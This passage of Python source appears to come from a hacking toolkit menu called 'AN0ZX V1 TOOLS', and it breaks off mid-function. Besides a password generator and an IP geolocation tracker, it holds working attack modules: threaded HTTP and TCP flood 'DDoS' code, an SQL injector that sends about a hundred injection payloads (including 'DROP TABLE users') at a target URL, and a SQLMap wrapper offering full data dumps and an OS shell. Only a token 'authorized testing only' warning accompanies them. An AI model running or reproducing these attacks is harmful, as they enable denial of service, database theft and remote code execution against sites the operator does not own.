            strength_score = sum([has_lower, has_upper, has_digit, has_symbol])
            if strength_score == 4:
                color = Fore.GREEN
                strength = "MAXIMUM"
            elif strength_score == 3:
                color = Fore.CYAN
                strength = "STRONG"
            elif strength_score == 2:
                color = Fore.YELLOW
                strength = "MEDIUM"
            else:
                color = Fore.RED
                strength = "WEAK"
            
            print(color + f"[{i+1:2d}] {password:<{length+2}} [{strength}]")
            break
    
    # Calculate and display statistics
    print(Fore.CYAN + "\n" + "="*70)
    print(Fore.YELLOW + "PASSWORD SECURITY ANALYSIS:")
    print(Fore.CYAN + "="*70)
    
    total_possible = len(chars) ** length
    print(Fore.CYAN + f"[+] Character set size: {len(chars)} characters")
    print(Fore.CYAN + f"[+] Password length: {length} characters")
    print(Fore.CYAN + f"[+] Possible combinations: {total_possible:,}")
    
    # Time to crack estimates
    hashes_per_second = 1000000000  # 1 billion hashes/second (modern GPU)
    seconds_to_crack = total_possible / hashes_per_second
    
    if seconds_to_crack < 60:
        time_str = f"{seconds_to_crack:.1f} seconds"
    elif seconds_to_crack < 3600:
        time_str = f"{seconds_to_crack/60:.1f} minutes"
    elif seconds_to_crack < 86400:
        time_str = f"{seconds_to_crack/3600:.1f} hours"
    elif seconds_to_crack < 31536000:
        time_str = f"{seconds_to_crack/86400:.1f} days"
    elif seconds_to_crack < 3153600000:
        time_str = f"{seconds_to_crack/31536000:.1f} years"
    else:
        time_str = f"{seconds_to_crack/3153600000:.1f} centuries"
    
    print(Fore.CYAN + f"[+] Time to crack (1B hashes/sec): {time_str}")
    
    # Entropy calculation
    entropy = length * (len(chars).bit_length())
    print(Fore.CYAN + f"[+] Password entropy: {entropy} bits")
    
    if entropy >= 128:
        print(Fore.GREEN + "[+] Security Level: MILITARY GRADE")
    elif entropy >= 80:
        print(Fore.CYAN + "[+] Security Level: BANKING GRADE")
    elif entropy >= 60:
        print(Fore.YELLOW + "[+] Security Level: STANDARD")
    else:
        print(Fore.RED + "[+] Security Level: WEAK")
    
    # Save to file
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"passwords_{timestamp}.txt"
    
    try:
        with open(filename, 'w', encoding='utf-8') as f:
            f.write("="*70 + "\n")
            f.write("AN0ZX V1 TOOLS - PASSWORD GENERATOR REPORT\n")
            f.write("="*70 + "\n\n")
            f.write(f"Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Number of passwords: {count}\n")
            f.write(f"Password length: {length}\n")
            f.write(f"Character set size: {len(chars)}\n")
            f.write(f"Entropy: {entropy} bits\n\n")
            
            f.write("PASSWORDS:\n")
            f.write("-"*50 + "\n")
            for i, pwd in enumerate(passwords, 1):
                f.write(f"{i:2d}. {pwd}\n")
            
            f.write("\n" + "="*70 + "\n")
            f.write("SECURITY TIPS:\n")
            f.write("-"*50 + "\n")
            f.write("1. Never reuse passwords across sites\n")
            f.write("2. Use a password manager\n")
            f.write("3. Enable two-factor authentication\n")
            f.write("4. Change passwords periodically\n")
            f.write("5. Never share passwords\n")
        
        print(Fore.GREEN + f"\n[✓] Passwords saved to: {filename}")
        print(Fore.YELLOW + "[!] Keep this file secure and delete after use!")
    except:
        print(Fore.RED + "[✗] Failed to save passwords")
    
    input(Fore.YELLOW + "\n[?] Press Enter to continue...")

def ip_tracking_menu():
    """IP Address Tracking with real-time location"""
    clear_screen()
    typing_effect(IP_TRACKING_ASCII)
    print(Fore.YELLOW + "=" * 70)
    print(Fore.CYAN + " " * 20 + "IP TRACKING SYSTEM (REAL-TIME)")
    print(Fore.YELLOW + "=" * 70)
    
    print(Fore.YELLOW + "\n[!] Get accurate location and information from any IP address")
    print(Fore.YELLOW + "[!] Real-time data with maximum accuracy\n")
    
    ip = input(Fore.CYAN + "[?] Enter IP Address (or press Enter for your IP): " + Fore.WHITE).strip()
    
    if not ip:
        # Get user's public IP
        try:
            response = requests.get('https://api.ipify.org', timeout=5)
            ip = response.text.strip()
            print(Fore.GREEN + f"[+] Your IP Address: {ip}")
        except:
            ip = "8.8.8.8"  # Default to Google DNS
            print(Fore.YELLOW + "[!] Using default IP: 8.8.8.8")
    
    # Validate IP
    try:
        ipaddress.ip_address(ip)
    except ValueError:
        print(Fore.RED + "[✗] Invalid IP address format!")
        input(Fore.YELLOW + "\n[?] Press Enter to continue...")
        return
    
    print(Fore.CYAN + "\n[+] Tracking IP address...")
    loading_animation(f"Gathering intelligence on {ip}", 3)
    
    # Multiple IP geolocation APIs (for redundancy and accuracy)
    apis = [
        {
            "name": "ipapi.co",
            "url": f"https://ipapi.co/{ip}/json/",
            "fields": {
                "ip": "ip",
                "city": "city",
                "region": "region",
                "country": "country_name",
                "isp": "org",
                "lat": "latitude",
                "lon": "longitude",
                "timezone": "timezone"
            }
        },
        {
            "name": "ip-api.com",
            "url": f"http://ip-api.com/json/{ip}",
            "fields": {
                "ip": "query",
                "city": "city",
                "region": "regionName",
                "country": "country",
                "isp": "isp",
                "lat": "lat",
                "lon": "lon",
                "timezone": "timezone"
            }
        },
        {
            "name": "ipinfo.io",
            "url": f"https://ipinfo.io/{ip}/json",
            "fields": {
                "ip": "ip",
                "city": "city",
                "region": "region",
                "country": "country",
                "isp": "org",
                "loc": "loc"  # lat,lon format
            }
        }
    ]
    
    ip_info = {}
    successful_apis = []
    
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    })
    
    print(Fore.CYAN + "\n[+] Querying multiple geolocation services...")
    
    for api in apis:
        try:
            response = session.get(api["url"], timeout=5)
            if response.status_code == 200:
                data = response.json()
                
                # Extract information
                info = {}
                for key, field in api["fields"].items():
                    if field in data and data[field]:
                        info[key] = data[field]
                
                if info:
                    ip_info[api["name"]] = info
                    successful_apis.append(api["name"])
                    print(Fore.GREEN + f"[✓] {api['name']}: Success")
                else:
                    print(Fore.YELLOW + f"[!] {api['name']}: No data")
            else:
                print(Fore.YELLOW + f"[!] {api['name']}: API Error")
        except:
            print(Fore.RED + f"[✗] {api['name']}: Failed")
    
    if not ip_info:
        print(Fore.RED + "\n[✗] Could not retrieve IP information")
        input(Fore.YELLOW + "\n[?] Press Enter to continue...")
        return
    
    print(Fore.GREEN + f"\n[✓] Data retrieved from {len(successful_apis)} sources")
    
    # Process and merge data
    merged_info = {
        "ip": ip,
        "sources": successful_apis,
        "timestamp": datetime.datetime.now().isoformat()
    }
    
    # Try to get consensus data
    fields_to_check = ["city", "region", "country", "isp"]
    
    for field in fields_to_check:
        values = []
        for api_name, data in ip_info.items():
            if field in data:
                values.append(data[field])
        
        if values:
            # Find most common value
            from collections import Counter
            counter = Counter(values)
            most_common = counter.most_common(1)[0][0]
            merged_info[field] = most_common
            merged_info[f"{field}_sources"] = len([v for v in values if v == most_common])
    
    # Get coordinates
    lat_lon_sources = []
    for api_name, data in ip_info.items():
        if "lat" in data and "lon" in data:
            lat_lon_sources.append((data["lat"], data["lon"], api_name))
        elif "loc" in data:
            try:
                lat, lon = data["loc"].split(",")
                lat_lon_sources.append((float(lat), float(lon), api_name))
            except:
                pass
    
    if lat_lon_sources:
        # Average coordinates
        avg_lat = sum(lat for lat, _, _ in lat_lon_sources) / len(lat_lon_sources)
        avg_lon = sum(lon for _, lon, _ in lat_lon_sources) / len(lat_lon_sources)
        merged_info["latitude"] = round(avg_lat, 6)
        merged_info["longitude"] = round(avg_lon, 6)
        merged_info["coord_sources"] = len(lat_lon_sources)
    
    # Additional checks
    try:
        # Check if IP is from VPN/Proxy
        vpn_checks = [
            f"https://ipinfo.io/{ip}/json",
            f"https://v2.api.iphub.info/ip/{ip}"
        ]
        
        vpn_detected = False
        for check_url in vpn_checks:
            try:
                resp = session.get(check_url, timeout=3)
                if resp.status_code == 200:
                    data = resp.json()
                    if "proxy" in str(data).lower() or "vpn" in str(data).lower():
                        vpn_detected = True
                        break
            except:
                continue
        
        merged_info["vpn_proxy"] = vpn_detected
        
        # Check for reserved IPs
        ip_obj = ipaddress.ip_address(ip)
        merged_info["is_private"] = ip_obj.is_private
        merged_info["is_reserved"] = ip_obj.is_reserved
        
        # Get WHOIS-like information
        try:
            import socket
            hostname = socket.gethostbyaddr(ip)[0]
            merged_info["hostname"] = hostname
        except:
            merged_info["hostname"] = "Not found"
    
    except:
        pass
    
    # Display results
    print(Fore.CYAN + "\n" + "="*70)
    print(Fore.YELLOW + "IP TRACKING RESULTS:")
    print(Fore.CYAN + "="*70)
    
    print(Fore.GREEN + f"\n[+] IP ADDRESS: {merged_info['ip']}")
    
    if "hostname" in merged_info:
        print(Fore.CYAN + f"[+] Hostname: {merged_info['hostname']}")
    
    if "country" in merged_info:
        print(Fore.CYAN + f"[+] Country: {merged_info['country']}")
        if "country_sources" in merged_info:
            print(Fore.YELLOW + f"    Confirmed by {merged_info['country_sources']} sources")
    
    if "region" in merged_info:
        print(Fore.CYAN + f"[+] Region/State: {merged_info['region']}")
    
    if "city" in merged_info:
        print(Fore.CYAN + f"[+] City: {merged_info['city']}")
    
    if "isp" in merged_info:
        print(Fore.CYAN + f"[+] ISP/Organization: {merged_info['isp']}")
    
    if "latitude" in merged_info and "longitude" in merged_info:
        print(Fore.CYAN + f"[+] Coordinates: {merged_info['latitude']}, {merged_info['longitude']}")
        print(Fore.YELLOW + f"    Accuracy: {merged_info.get('coord_sources', 1)} sources")
        
        # Google Maps link
        maps_url = f"https://maps.google.com/?q={merged_info['latitude']},{merged_info['longitude']}"
        print(Fore.CYAN + f"[+] Google Maps: {maps_url}")
    
    if "timezone" in merged_info:
        print(Fore.CYAN + f"[+] Timezone: {merged_info['timezone']}")
    
    # Security analysis
    print(Fore.MAGENTA + "\n" + "-"*70)
    print(Fore.YELLOW + "SECURITY ANALYSIS:")
    print(Fore.MAGENTA + "-"*70)
    
    if merged_info.get("is_private"):
        print(Fore.RED + "[!] PRIVATE IP ADDRESS")
        print(Fore.YELLOW + "    This is a local/private IP (192.168.x.x, 10.x.x.x, etc.)")
    elif merged_info.get("is_reserved"):
        print(Fore.YELLOW + "[!] RESERVED IP ADDRESS")
        print(Fore.YELLOW + "    This IP is reserved for special purposes")
    else:
        print(Fore.GREEN + "[✓] PUBLIC IP ADDRESS")
    
    if merged_info.get("vpn_proxy"):
        print(Fore.RED + "[!] VPN/PROXY DETECTED")
        print(Fore.YELLOW + "    This IP may be using anonymization services")
    else:
        print(Fore.GREEN + "[✓] No VPN/Proxy detected (based on available data)")
    
    # Network information
    try:
        # Try to get network range
        whois_cmd = f"whois {ip}" if os.name != 'nt' else f"nslookup {ip}"
        result = subprocess.run(whois_cmd, shell=True, capture_output=True, text=True, timeout=5)
        
        if result.returncode == 0:
            whois_output = result.stdout[:500]  # First 500 chars
            if "netname" in whois_output.lower() or "inetnum" in whois_output.lower():
                print(Fore.CYAN + "\n[+] WHOIS Information available")
    except:
        pass
    
    # Save report
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"ip_tracking_{ip.replace('.', '_')}_{timestamp}.txt"
    
    try:
        with open(filename, 'w', encoding='utf-8') as f:
            f.write("="*70 + "\n")
            f.write("AN0ZX V1 TOOLS - IP TRACKING REPORT\n")
            f.write("="*70 + "\n\n")
            f.write(f"Target IP: {merged_info['ip']}\n")
            f.write(f"Report Date: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Data Sources: {', '.join(merged_info['sources'])}\n\n")
            
            f.write("LOCATION INFORMATION:\n")
            f.write("-"*50 + "\n")
            for field in ['country', 'region', 'city', 'isp', 'hostname']:
                if field in merged_info:
                    f.write(f"{field.title():15}: {merged_info[field]}\n")
            
            if 'latitude' in merged_info and 'longitude' in merged_info:
                f.write(f"{'Coordinates':15}: {merged_info['latitude']}, {merged_info['longitude']}\n")
                f.write(f"{'Google Maps':15}: https://maps.google.com/?q={merged_info['latitude']},{merged_info['longitude']}\n")
            
            f.write("\nTECHNICAL INFORMATION:\n")
            f.write("-"*50 + "\n")
            f.write(f"{'IP Type':15}: {'Private' if merged_info.get('is_private') else 'Public'}\n")
            f.write(f"{'VPN/Proxy':15}: {'Detected' if merged_info.get('vpn_proxy') else 'Not detected'}\n")
            
            if 'timezone' in merged_info:
                f.write(f"{'Timezone':15}: {merged_info['timezone']}\n")
            
            f.write("\n" + "="*70 + "\n")
            f.write("RAW API DATA:\n")
            f.write("="*70 + "\n")
            for api_name, data in ip_info.items():
                f.write(f"\n{api_name}:\n")
                f.write("-"*30 + "\n")
                for key, value in data.items():
                    f.write(f"  {key}: {value}\n")
        
        print(Fore.GREEN + f"\n[✓] Full report saved to: {filename}")
    except Exception as e:
        print(Fore.RED + f"[✗] Failed to save report: {str(e)}")
    
    print(Fore.CYAN + "\n" + "="*70)
    print(Fore.YELLOW + "Note: IP geolocation accuracy varies")
    print(Fore.YELLOW + "Mobile devices and VPNs may show different locations")
    print(Fore.CYAN + "="*70)
    
    input(Fore.YELLOW + "\n[?] Press Enter to continue...")

# Main menu display
def show_main_menu(username):
    """Display main menu with user info"""
    now = datetime.datetime.now()
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
    
    clear_screen()
    
    # Display main ASCII with color effect
    print(color_changer(MAIN_ASCII))
    
    # User info section
    print(Fore.CYAN + "=" * 70)
    print(f"{Fore.GREEN} Hallo: {Fore.YELLOW}{username}")
    print(f"{Fore.GREEN} Tanggal: {Fore.YELLOW}{now.strftime('%d %B %Y')}")
    print(f"{Fore.GREEN} Waktu: {Fore.YELLOW}{now.strftime('%H:%M:%S')}")
    print(f"{Fore.GREEN} Hari: {Fore.YELLOW}{now.strftime('%A')}")
    print(Fore.CYAN + "-" * 70)
    print(f"{Fore.GREEN} Creator: {Fore.YELLOW}mrzxx & AN0MALIXPLOIT")
    print(f"{Fore.GREEN} Telegram: {Fore.YELLOW}@Zxxtirwd & @An0maliXGR")
    print(f"{Fore.GREEN} License: {Fore.YELLOW}AN0ZX V1")
    print(Fore.CYAN + "=" * 70)
    
    # Menu options - UPDATED WITH OSINT
    print(Fore.YELLOW + "\n[1] DDOS ATTACK")
    print(Fore.YELLOW + "[2] SQL INJECTOR (100+ Methods)")
    print(Fore.YELLOW + "[3] SQLMAP (REAL)")
    print(Fore.YELLOW + "[4] NMAP (REAL)")
    print(Fore.YELLOW + "[5] OSINT TOOLS (NEW!)")
    print(Fore.YELLOW + "[6] Exit")
    print(Fore.CYAN + "-" * 70)

# [KEEP ALL EXISTING FUNCTIONS FROM ORIGINAL CODE HERE]
# DDOS Attack Module (unchanged)
def ddos_menu():
    """DDOS Attack Menu"""
    clear_screen()
    typing_effect(DDOS_ASCII)
    print(Fore.RED + "=" * 70)
    print(Fore.YELLOW + " " * 25 + "DDOS ATTACK SYSTEM")
    print(Fore.RED + "=" * 70)
    
    while True:
        print(Fore.YELLOW + "\n[1] DDOS Website (Layer 7)")
        print(Fore.YELLOW + "[2] DDOS IP Address (Layer 4)")
        print(Fore.YELLOW + "[3] Back to Main Menu")
        print(Fore.RED + "-" * 70)
        
        choice = input(Fore.CYAN + "\n[?] Select option (1-3): " + Fore.WHITE).strip()
        
        if choice == "1":
            ddos_web_menu()
        elif choice == "2":
            ddos_ip_menu()
        elif choice == "3":
            typing_effect("\nReturning to main menu...")
            return
        else:
            print(Fore.RED + "[✗] Invalid choice!")

def ddos_web_menu():
    """DDOS Website Menu"""
    clear_screen()
    print(DDOS_ASCII)
    print(Fore.RED + "=" * 70)
    print(Fore.YELLOW + " " * 25 + "WEBSITE DDOS (LAYER 7)")
    print(Fore.RED + "=" * 70)
    
    print(Fore.YELLOW + "\n[!] WARNING: For authorized testing only!")
    print(Fore.YELLOW + "[!] Illegal use is prohibited!\n")
    
    target = input(Fore.CYAN + "[?] Target URL (http://example.com): " + Fore.WHITE).strip()
    
    if not target.startswith('http'):
        target = 'http://' + target
    
    print(Fore.YELLOW + "\n[+] Select Attack Method:")
    print(Fore.YELLOW + "[1] HTTP Flood (Layer 7)")
    print(Fore.YELLOW + "[2] Slowloris Attack")
    print(Fore.YELLOW + "[3] POST Flood")
    print(Fore.YELLOW + "[4] Mixed Attack")
    print(Fore.RED + "-" * 70)
    
    method = input(Fore.CYAN + "[?] Select method (1-4): " + Fore.WHITE).strip()
    
    try:
        threads = int(input(Fore.CYAN + "[?] Threads (50-500): " + Fore.WHITE) or "100")
        duration = int(input(Fore.CYAN + "[?] Duration seconds (30-300): " + Fore.WHITE) or "60")
    except:
        threads = 100
        duration = 60
    
    threads = max(50, min(500, threads))
    duration = max(30, min(300, duration))
    
    print(Fore.RED + "\n" + "="*70)
    print(Fore.RED + "[!] FINAL CONFIRMATION")
    print(Fore.RED + f"[!] Target: {target}")
    print(Fore.RED + f"[!] Method: {method}")
    print(Fore.RED + f"[!] Threads: {threads}")
    print(Fore.RED + f"[!] Duration: {duration}s")
    print(Fore.RED + "="*70)
    
    confirm = input(Fore.RED + "\n[?] START ATTACK? (y/n): " + Fore.WHITE).lower()
    
    if confirm == 'y':
        # Real DDOS attack implementation
        class WebDDoSAttack:
            def __init__(self):
                self.active = False
                self.requests = 0
                
            def attack_thread(self, url):
                session = requests.Session()
                while self.active:
                    try:
                        session.get(url, timeout=2)
                        self.requests += 1
                    except:
                        pass
            
            def start(self, url, threads, duration):
                self.active = True
                self.requests = 0
                start_time = time.time()
                
                print(Fore.RED + "\n[!] ATTACK STARTED!\n")
                
                # Start threads
                thread_list = []
                for _ in range(threads):
                    t = threading.Thread(target=self.attack_thread, args=(url,))
                    t.daemon = True
                    t.start()
                    thread_list.append(t)
                
                # Monitor attack
                end_time = time.time() + duration
                while time.time() < end_time and self.active:
                    elapsed = time.time() - start_time
                    rps = self.requests / elapsed if elapsed > 0 else 0
                    print(Fore.YELLOW + f"[+] Requests: {self.requests:,} | RPS: {rps:.1f} | Time: {int(elapsed)}s", end='\r')
                    time.sleep(1)
                
                self.active = False
                total_time = time.time() - start_time
                rps = self.requests / total_time if total_time > 0 else 0
                
                print(Fore.GREEN + "\n" + "="*70)
                print(Fore.GREEN + "[✓] ATTACK COMPLETED!")
                print(Fore.GREEN + f"[+] Total Requests: {self.requests:,}")
                print(Fore.GREEN + f"[+] Duration: {total_time:.1f}s")
                print(Fore.GREEN + f"[+] Average RPS: {rps:.1f}")
                print(Fore.GREEN + "="*70)
        
        attack = WebDDoSAttack()
        attack.start(target, threads, duration)
    
    input(Fore.YELLOW + "\n[?] Press Enter to continue...")

def ddos_ip_menu():
    """DDOS IP Address Menu"""
    clear_screen()
    print(DDOS_ASCII)
    print(Fore.RED + "=" * 70)
    print(Fore.YELLOW + " " * 25 + "IP DDOS (LAYER 4)")
    print(Fore.RED + "=" * 70)
    
    print(Fore.YELLOW + "\n[!] WARNING: For authorized testing only!")
    
    target_ip = input(Fore.CYAN + "[?] Target IP Address: " + Fore.WHITE).strip()
    target_port = input(Fore.CYAN + "[?] Target Port (80): " + Fore.WHITE).strip() or "80"
    
    print(Fore.YELLOW + "\n[+] Select Attack Method:")
    print(Fore.YELLOW + "[1] SYN Flood")
    print(Fore.YELLOW + "[2] UDP Flood")
    print(Fore.YELLOW + "[3] ICMP Flood")
    print(Fore.RED + "-" * 70)
    
    method = input(Fore.CYAN + "[?] Select method (1-3): " + Fore.WHITE).strip()
    
    try:
        threads = int(input(Fore.CYAN + "[?] Threads (50-500): " + Fore.WHITE) or "100")
        duration = int(input(Fore.CYAN + "[?] Duration seconds (30-300): " + Fore.WHITE) or "60")
    except:
        threads = 100
        duration = 60
    
    print(Fore.RED + "\n" + "="*70)
    print(Fore.RED + "[!] FINAL CONFIRMATION")
    print(Fore.RED + f"[!] Target: {target_ip}:{target_port}")
    print(Fore.RED + f"[!] Method: {method}")
    print(Fore.RED + f"[!] Threads: {threads}")
    print(Fore.RED + f"[!] Duration: {duration}s")
    print(Fore.RED + "="*70)
    
    confirm = input(Fore.RED + "\n[?] START ATTACK? (y/n): " + Fore.WHITE).lower()
    
    if confirm == 'y':
        # Real IP flood implementation
        class IPDDoSAttack:
            def __init__(self):
                self.active = False
                self.packets = 0
                
            def flood_thread(self, ip, port):
                while self.active:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(1)
                        sock.connect((ip, int(port)))
                        sock.close()
                        self.packets += 1
                    except:
                        pass
            
            def start(self, ip, port, threads, duration):
                self.active = True
                self.packets = 0
                start_time = time.time()
                
                print(Fore.RED + "\n[!] ATTACK STARTED!\n")
                
                thread_list = []
                for _ in range(threads):
                    t = threading.Thread(target=self.flood_thread, args=(ip, port))
                    t.daemon = True
                    t.start()
                    thread_list.append(t)
                
                end_time = time.time() + duration
                while time.time() < end_time and self.active:
                    elapsed = time.time() - start_time
                    pps = self.packets / elapsed if elapsed > 0 else 0
                    print(Fore.YELLOW + f"[+] Packets: {self.packets:,} | PPS: {pps:.1f} | Time: {int(elapsed)}s", end='\r')
                    time.sleep(1)
                
                self.active = False
                total_time = time.time() - start_time
                pps = self.packets / total_time if total_time > 0 else 0
                
                print(Fore.GREEN + "\n" + "="*70)
                print(Fore.GREEN + "[✓] ATTACK COMPLETED!")
                print(Fore.GREEN + f"[+] Total Packets: {self.packets:,}")
                print(Fore.GREEN + f"[+] Duration: {total_time:.1f}s")
                print(Fore.GREEN + f"[+] Average PPS: {pps:.1f}")
                print(Fore.GREEN + "="*70)
        
        attack = IPDDoSAttack()
        attack.start(target_ip, target_port, threads, duration)
    
    input(Fore.YELLOW + "\n[?] Press Enter to continue...")

# SQL Injector Module (unchanged)
def sql_injector_menu():
    """SQL Injector with 100+ Methods"""
    clear_screen()
    typing_effect(SQL_INJECT_ASCII)
    print(Fore.YELLOW + "=" * 70)
    print(Fore.CYAN + " " * 20 + "SQL INJECTOR (100+ METHODS)")
    print(Fore.YELLOW + "=" * 70)
    
    url = input(Fore.CYAN + "\n[?] Target URL (http://site.com/page?id=1): " + Fore.WHITE).strip()
    
    if not url.startswith('http'):
        url = 'http://' + url
    
    print(Fore.CYAN + "\n[+] Analyzing target...")
    loading_animation("Checking target", 2)
    
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query)
    
    if not params:
        print(Fore.RED + "[✗] No parameters found!")
        input(Fore.YELLOW + "\n[?] Press Enter to continue...")
        return
    
    param_name = list(params.keys())[0]
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    
    print(Fore.GREEN + f"[✓] Parameter found: {param_name}")
    print(Fore.GREEN + f"[✓] Base URL: {base_url}")
    
    # Generate 100+ payloads
    print(Fore.CYAN + "\n[+] Generating 100+ SQL injection payloads...")
    
    payloads = []
    
    # Basic payloads (30)
    basics = [
        "'", "\"", "`", "')", "\")", "`)",
        "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' #",
        "' OR 1=1 --", "' OR 1=1 #", "' OR 1=1 /*",
        "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
        "' UNION SELECT 1--", "' UNION SELECT 1,2--",
        "' UNION SELECT @@version--", "' UNION SELECT user()--",
        "' UNION SELECT database()--", "' UNION SELECT @@datadir--",
        "' AND SLEEP(5)--", "' OR SLEEP(5)--",
        "'; WAITFOR DELAY '00:00:05'--",
        "' AND 1=1--", "' AND 1=2--",
        "' OR 'a'='a", "' OR 'a'='b",
        "'; DROP TABLE users--", "'; SELECT * FROM users--",
    ]
    payloads.extend(basics)
    
    # Error-based payloads (20)
    errors = [
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--",
        "' AND UPDATEXML(1,CONCAT(0x7e,@@version),1)--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "' AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE())>0--",
        "' AND (SELECT @a FROM (SELECT(@a:=0x00))a) --",
        "' AND (SELECT @a:=MID(BIN(FIELD(1,1)),1,1))--",
        "' PROCEDURE ANALYSE()--",
        "' AND GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'--",
        "' AND (SELECT * FROM users LIMIT 1)--",
        "' AND ASCII(SUBSTRING((SELECT user()),1,1))>0--",
    ]
    payloads.extend(errors)
    
    # Time-based payloads (20)
    for i in range(1, 11):
        payloads.append(f"' AND SLEEP({i})--")
        payloads.append(f"' OR SLEEP({i})--")
        payloads.append(f"') AND SLEEP({i})--")
        payloads.append(f"') OR SLEEP({i})--")
    
    # Boolean payloads (20)
    for i in range(1, 21):
        payloads.append(f"' AND {i}={i}--")
        payloads.append(f"' OR {i}={i}--")
        payloads.append(f"') AND {i}={i}--")
        payloads.append(f"') OR {i}={i}--")
    
    # Database-specific payloads (10)
    db_specific = [
        "' AND @@version LIKE '%MySQL%'--",
        "' UNION SELECT @@version,@@version_comment--",
        "' AND version() LIKE '%PostgreSQL%'--",
        "' UNION SELECT version(),current_user--",
        "' AND @@version LIKE '%Microsoft%'--",
        "' UNION SELECT @@version,db_name()--",
        "' AND banner LIKE '%Oracle%' FROM v$version--",
        "' UNION SELECT banner,NULL FROM v$version--",
        "' UNION SELECT sqlite_version(),NULL--",
        "' AND (SELECT COUNT(*) FROM sqlite_master)--",
    ]
    payloads.extend(db_specific)
    
    print(Fore.GREEN + f"[✓] Generated {len(payloads)} payloads")
    
    print(Fore.CYAN + "\n[+] Starting SQL injection test...")
    print(Fore.YELLOW + "[!] This may take a few minutes")
    print(Fore.YELLOW + "=" * 70)
    
    vulnerabilities = []
    session = requests.Session()
    
    for i, payload in enumerate(payloads[:50]):  # Test first 50 for speed
        print(Fore.YELLOW + f"[{i+1}/50] Testing payload...", end='\r')
        
        test_url = f"{base_url}?{param_name}={urllib.parse.quote(payload)}"
        
        try:
            response = session.get(test_url, timeout=5)
            
            # Check for SQL errors
            error_patterns = [
                r"SQL.*syntax.*error",
                r"Warning.*mysql",
                r"MySQL.*error",
                r"ORA-[0-9]{5}",
                r"PostgreSQL.*ERROR",
                r"Microsoft.*ODBC",
                r"division.*by.*zero",
                r"unknown.*column",
                r"Table.*doesn't.*exist",
                r"You have an error in your SQL syntax",
                r"mysql_fetch",
                r"mysqli_",
                r"SQLite3::",
                r"Unclosed quotation mark",
            ]
            
            for pattern in error_patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    if payload not in vulnerabilities:
                        vulnerabilities.append(payload)
                    break
            
            # Check for time-based
            if 'SLEEP' in payload:
                start = time.time()
                session.get(test_url, timeout=8)
                elapsed = time.time() - start
                if elapsed > 4:
                    if payload not in vulnerabilities:
                        vulnerabilities.append(payload)
            
        except:
            continue
    
    print("\n" + Fore.YELLOW + "=" * 70)
    
    if vulnerabilities:
        print(Fore.GREEN + f"\n[✓] Found {len(vulnerabilities)} vulnerabilities!")
        print(Fore.CYAN + "\n[+] Vulnerable payloads (first 10):")
        for i, vuln in enumerate(vulnerabilities[:10], 1):
            print(Fore.YELLOW + f"    {i}. {vuln}")
        
        print(Fore.CYAN + "\n[+] Running SQLMap for full exploitation...")
        time.sleep(2)
        run_sqlmap_tool(url)
    else:
        print(Fore.RED + "\n[✗] No SQL injection vulnerabilities detected")
        print(Fore.YELLOW + "[!] Try SQLMap for deeper testing")
    
    input(Fore.YELLOW + "\n[?] Press Enter to continue...")

# SQLMap Tool (unchanged)
def run_sqlmap_tool(target_url):
    """Run real SQLMap tool"""
    clear_screen()
    typing_effect(SQLMAP_ASCII)
    print(Fore.GREEN + "=" * 70)
    print(Fore.YELLOW + " " * 25 + "SQLMAP (REAL TOOL)")
    print(Fore.GREEN + "=" * 70)
    
    # Check if SQLMap is installed
    try:
        result = subprocess.run(["sqlmap", "--version"], capture_output=True, text=True)
        if "sqlmap" not in result.stdout.lower():
            raise FileNotFoundError
    except:
        print(Fore.RED + "[✗] SQLMap not found!")
        print(Fore.YELLOW + "[!] Install SQLMap first:")
        print(Fore.CYAN + "    pip install sqlmap")
        print(Fore.CYAN + "    or visit: https://sqlmap.org")
        input(Fore.YELLOW + "\n[?] Press Enter to continue...")
        return
    
    print(Fore.YELLOW + "\n[+] SQLMap Attack Options:")
    print(Fore.YELLOW + "[1] Basic scan (Find injections)")
    print(Fore.YELLOW + "[2] Get databases")
    print(Fore.YELLOW + "[3] Get tables")
    print(Fore.YELLOW + "[4] Dump all data")
    print(Fore.YELLOW + "[5] Get OS shell")
    print(Fore.YELLOW + "[6] Full aggressive scan")
    print(Fore.GREEN + "-" * 70)
    
    choice = input(Fore.CYAN + "[?] Select option (1-6): " + Fore.WHITE).strip()
    
    commands = {
        '1': f'sqlmap -u "{target_url}" --batch --level=3 --risk=2',
        '2': f'sqlmap -u "{target_url}" --batch --dbs',
        '3': f'sqlmap -u "{target_url}" --batch --tables',
        '4': f'sqlmap -u "{target_url}" --batch --dump-all --threads=10',
        '5': f'sqlmap -u "{target_url}" --batch --os-shell',
        '6': f'sqlmap -u "{target_url}" --batch --level=5 --risk=3 --dbs --tables --dump-all --threads=10'
    }
    
    if choice in commands:
        command = commands[choice]
    else:
        command = f'sqlmap -u "{target_url}" --batch --dbs'
    
    print(Fore.CYAN + f"\n[+] Executing: {command}")
    print(Fore.YELLOW + "[!] This may take several minutes...")
    print(Fore.GREEN + "=" * 70)
    
    try:
        process = subprocess.Popen(
            command.split(),
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            universal_newlines=True,
            bufsize=1
        )
        
        print(Fore.CYAN + "\n[+] SQLMap Output:\n")
        
        for line in iter(process.stdout.readline, ''):
            line = line.strip()
            if not line:
                continue
                
            if "target url" in line.lower():
                print(Fore.CYAN + line)
            elif "testing" in line.lower():
                print(Fore.YELLOW + line)
            elif "vulnerable" in line.lower():
                print(Fore.GREEN + line)
